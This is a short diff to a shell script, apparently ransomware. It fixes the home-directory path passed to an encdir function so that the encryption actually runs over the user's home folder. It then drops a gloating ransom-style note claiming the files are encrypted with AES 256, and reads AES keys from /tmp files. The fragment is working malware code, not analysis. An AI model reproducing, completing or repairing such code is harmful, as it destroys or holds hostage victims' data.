@@ -40,7 +40,8 @@ encdir()
 	done
 }
 
-encdir "~/"
+m=`echo ~/`
+encdir "$m"
 echo "HeHeHe All your home directory is encrypted with AES 256" > ~/OpenIt.txt
 l=`cat /tmp/AesKey1.txt`
 m=`cat /tmp/AesKey2.txt`
